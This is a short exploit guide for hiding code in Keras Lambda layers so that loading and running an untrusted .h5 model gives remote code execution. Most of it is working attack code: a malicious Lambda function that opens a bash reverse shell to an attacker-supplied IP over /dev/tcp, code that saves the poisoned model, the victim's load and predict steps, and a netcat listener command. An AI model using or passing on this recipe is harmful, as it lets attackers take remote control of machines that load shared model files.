
### **The Vulnerability**

* **Keras `Lambda` layers** allow **custom Python code**.
* When loading a model (`.h5`) using `load_model(...)`, **that code is deserialized**.
* When `.predict(...)` is called, the Lambda’s code is **executed**.
* So, if someone loads an **untrusted `.h5`**, you can get **remote code execution (RCE)**.

---

###  **How to Exploit**

1. **Write a malicious function** inside a `Lambda`:

   ```python
   def exploit(x):
       import os
       os.system("bash -i >& /dev/tcp/YOUR_IP/4444 0>&1")
       return x
   ```

2. **Create the model**:

   ```python
   from tensorflow.keras.models import Sequential
   from tensorflow.keras.layers import Input, Lambda

   model = Sequential([
       Input(shape=(1,)),
       Lambda(exploit)
   ])
   model.save("exploit.h5")
   ```

3. **Victim loads it** and runs:

   ```python
   model = load_model("exploit.h5", compile=False)
   model.predict([[1]])
   ```

4. ✅ You get a **reverse shell** on your machine (start `nc -lvnp 4444` beforehand).
